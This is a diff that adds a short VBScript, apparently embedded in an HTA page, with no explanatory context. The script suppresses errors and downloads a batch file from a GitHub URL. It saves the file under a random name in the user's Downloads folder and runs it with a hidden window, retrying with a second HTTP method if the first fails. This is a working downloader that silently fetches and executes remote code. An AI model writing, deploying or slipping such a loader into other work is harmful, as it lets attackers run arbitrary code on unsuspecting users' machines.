@@ -1,0 +1,61 @@
+
+    On Error Resume Next
+    
+    Dim objShell, objFSO, objHTTP, objFile
+    Dim strDownloadsFolder, strBatFile, strDownloadURL
+    Dim intCounter, strRandomName, objWshShell
+    
+    strDownloadURL = "https://raw.githubusercontent.com/mikepattersondiscord-ctrl/.bat/main/test.bat"
+    
+    Set objShell = CreateObject("WScript.Shell")
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objWshShell = CreateObject("Shell.Application")
+    
+    strDownloadsFolder = objWshShell.NameSpace("shell:Downloads").Self.Path
+    
+    Randomize
+    strRandomName = ""
+    For intCounter = 1 To 7
+        strRandomName = strRandomName & Int((9 * Rnd) + 1)
+    Next
+    strBatFile = strDownloadsFolder & "\" & strRandomName & ".bat"
+    
+    ' primary download
+    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
+    objHTTP.Open "GET", strDownloadURL, False
+    objHTTP.SetTimeouts 5000, 5000, 10000, 10000
+    objHTTP.Send
+    
+    If objHTTP.Status = 200 Then
+        Set objFile = objFSO.CreateTextFile(strBatFile, True, False)
+        objFile.Write objHTTP.ResponseText
+        objFile.Close
+        
+        If objFSO.FileExists(strBatFile) Then
+            objShell.Run Chr(34) & strBatFile & Chr(34), 0, False
+        End If
+    End If
+    
+    ' fallback
+    If Not objFSO.FileExists(strBatFile) Then
+        Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
+        objHTTP.Open "GET", strDownloadURL, False
+        objHTTP.Send
+        
+        If objHTTP.Status = 200 Then
+            Set objFile = objFSO.CreateTextFile(strBatFile, True, False)
+            objFile.Write objHTTP.ResponseText
+            objFile.Close
+            
+            If objFSO.FileExists(strBatFile) Then
+                objShell.Run Chr(34) & strBatFile & Chr(34), 0, False
+            End If
+        End If
+    End If
+    
+    Set objHTTP = Nothing
+    Set objFSO = Nothing
+    Set objShell = Nothing
+    Set objWshShell = Nothing
+    
+    window.close
